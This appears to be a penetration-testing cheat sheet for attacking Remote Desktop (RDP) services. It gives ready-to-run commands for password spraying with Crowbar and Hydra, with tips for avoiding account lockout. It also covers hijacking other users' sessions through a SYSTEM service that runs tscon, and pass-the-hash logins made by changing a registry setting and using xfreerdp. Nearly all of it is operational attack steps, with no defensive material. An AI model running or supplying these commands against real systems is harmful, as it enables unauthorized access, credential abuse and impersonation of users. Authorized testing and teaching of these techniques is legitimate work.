## RDP Enumeration and Password Spraying

RDP open on TCP/3389 with a need to identify valid credentials while bypassing **account lockout policies**.

Identify the service and port state

```
nmap -Pn -p3389 <TARGET_IP>
```

Perform password spraying using Crowbar to test one password against multiple users

```
crowbar -b rdp -s <TARGET_IP>/32 -U <FILE_PATH> -c '<PASSWORD>'
```

Perform password spraying using Hydra with throttled connections to avoid service instability

```
hydra -L <FILE_PATH> -p '<PASSWORD>' <TARGET_IP> rdp
```

- Crowbar
    
    - `crowbar -b rdp -s <TARGET_IP>/32 -U <FILE_PATH> -c '<PASSWORD>'`
    - Prefer for straightforward RDP-specific spraying.
- Hydra
    
    - `hydra -L <FILE_PATH> -p '<PASSWORD>' <TARGET_IP> rdp`
    - Prefer when granular control over connection speed and parallel tasks is required to prevent **service crashes**.
- **Account lockout** will trigger if the password policy is exceeded; spray a single password across the user list before switching to a new one.
    
- **RDP connection limits** often cause Hydra to fail; use `-t 1` or `-W 1` to reduce parallel tasks and wait between attempts.
    

## RDP Session Hijacking

A machine is compromised with **local administrator** access and other active user sessions exist for impersonation.

List active sessions to find a target UserID and the current session name

```
query user
```

Create a system service to execute the hijack command as **SYSTEM**

```
sc.exe create <SERVICE_NAME> binpath= "cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>"
```

Trigger the hijacking service to open the target's desktop

```
net start <SERVICE_NAME>
```

- **Server 2019** prevents this specific service-based hijacking method.
- **SYSTEM privileges** are mandatory to use `tscon.exe` for session impersonation without the target's password.

## RDP Pass-the-Hash

GUI access is required but only the NTLM hash is available from the SAM or memory.

Modify the registry to allow Restricted Admin Mode for PtH authentication

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Connect to the target using the NT hash

```
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /pth:<HASH>
```

- **DisableRestrictedAdmin** must be set to `0x0` or the connection will be blocked by account restrictions.
- **Plaintext credentials** are not required if the registry modification is successful and `xfreerdp` is used with the `/pth` flag.